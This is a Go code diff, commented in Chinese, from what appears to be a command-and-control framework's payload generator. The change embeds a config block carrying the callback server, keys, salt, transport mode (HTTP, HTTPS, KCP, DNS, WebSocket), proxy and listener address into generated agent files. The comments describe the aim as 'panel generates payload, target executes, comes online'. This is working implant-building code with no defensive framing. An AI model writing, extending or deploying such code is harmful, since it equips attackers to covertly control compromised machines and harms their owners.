@@ -176,6 +176,35 @@ func PoBuild(l *Listener, cfg PoConfig) *PoPayload {
 		return &PoPayload{Mode: cfg.Mode, Filename: filename, MimeType: mime, Err: err}
 	}
 
+	// 追加**自描述配置块**（复刻端扩展）：让自研 agent 从自身文件尾部读取
+	// server/vkey/salt，实现"面板生成载荷 → 目标机执行 → 上线"而无需 ldflags。
+	// 原版配置块（PoConfigBlock）仍写在前面，作为对齐证据保留。
+	mode := poTransportMode(cfg, l)
+	addr := poConnectAddr(cfg, l)
+	cfgMap := map[string]string{
+		"server": poServerURL(mode, addr),
+		"vkey":   verifier,
+		"salt":   salt,
+		"mode":   mode,
+	}
+	// DNS 通道的查询要打到具体 DNS 服务器：把监听器地址一并写进配置块，
+	// agent 侧对应 main.DNSServer。
+	if strings.HasPrefix(strings.ToLower(mode), "dns") && addr != "" {
+		cfgMap["dns_server"] = addr
+	}
+	if cfg.Proxy != "" {
+		cfgMap["proxy"] = cfg.Proxy
+	}
+	if cfg.Host != "" && cfg.Port > 0 {
+		cfgMap["listen_host"] = cfg.Host
+		cfgMap["listen_port"] = itoa(cfg.Port)
+	}
+	withCfg, cerr := AppendAgentConfigBlock(res.Data, cfgMap)
+	if cerr != nil {
+		return &PoPayload{Mode: cfg.Mode, Filename: filename, MimeType: mime, Err: cerr}
+	}
+	res.Data = withCfg
+
 	p := &PoPayload{
 		Data:       res.Data,
 		Filename:   filename,
@@ -398,3 +427,61 @@ func poIsDNSTransport(cfg PoConfig, l *Listener) bool {
 	return false
 }
 
+// poServerURL 按传输模式给地址加协议前缀（agent 用 "scheme://addr" 选传输）。
+func poServerURL(mode, addr string) string {
+	if addr == "" {
+		return ""
+	}
+	switch strings.ToLower(mode) {
+	case "kcp":
+		return "kcp://" + addr
+	case "dns", "doh", "dot":
+		return "dns://" + addr
+	case "websocket", "ws", "cdn_websocket":
+		return "ws://" + addr
+	case "https", "wss":
+		return "https://" + addr
+	default:
+		return "http://" + addr
+	}
+}
+
+// poConnectAddr 返回 agent 应当连接的地址：优先监听器的 ConnectAddr，
+// 否则用 ListenAddr（面板填的 Host:Port）。
+func poConnectAddr(cfg PoConfig, l *Listener) string {
+	if l != nil {
+		if l.ConnectAddr != "" {
+			return l.ConnectAddr
+		}
+		if l.ListenAddr != "" {
+			return l.ListenAddr
+		}
+	}
+	if cfg.Host != "" && cfg.Port > 0 {
+		return cfg.Host + ":" + itoa(cfg.Port)
+	}
+	return ""
+}
+
+// itoa 是本文件内最小的整数格式化（避免为了一个转换引入 fmt 的格式化开销）。
+func itoa(v int) string {
+	if v == 0 {
+		return "0"
+	}
+	neg := v < 0
+	if neg {
+		v = -v
+	}
+	var buf [20]byte
+	i := len(buf)
+	for v > 0 {
+		i--
+		buf[i] = byte('0' + v%10)
+		v /= 10
+	}
+	if neg {
+		i--
+		buf[i] = '-'
+	}
+	return string(buf[i:])
+}
